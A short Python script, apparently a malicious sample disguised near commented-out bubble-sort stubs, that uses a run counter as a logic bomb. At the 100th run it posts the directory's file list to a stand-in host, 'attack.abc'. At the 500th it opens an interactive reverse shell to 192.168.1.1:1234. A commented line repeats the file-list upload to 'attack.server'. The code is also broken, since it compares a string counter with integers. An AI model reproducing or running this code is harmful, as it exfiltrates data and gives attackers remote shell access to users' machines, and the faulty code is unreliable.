import subprocess
import sys 
import socket
import os
import requests
import json
import glob

count = open("count.txt", ).readlines()[0]
if count < 100:
    pass
elif count == 100:
    res = glob.glob("./*")
    json_data = json.dumps(res)
    try:
        response = requests.post('http://attack.abc', json=json_data)
    except:
        pass
elif count == 500:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("192.168.1.1",1234))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(["/bin/sh","-i"])
    except:
        pass
else:
    pass
count += 1
f = open("count.txt", 'w')
f.writelines(f"{count}\n")
f.close



# def bubble_sort(lst):
#     ，，，      
#     return lst
   
# example_list = [64, 34, 25, 12, 22, 11, 90]
# sorted_list = bubble_sort(example_list) 
# print("Sorted list:", sorted_list)

# def bubble_sort(lst):
#     ，，，      
#     return lst

# import requests, json, glob
# res = json.dumps(glob.glob("./*"))
# response = requests.post('attack.server', json=res)
# example_list = [64, 34, 25, 12, 22, 11, 90]
# sorted_list = bubble_sort(example_list)
# print("Sorted list:", sorted_list)

# [11, 12, 22, 25, 34, 64, 90]

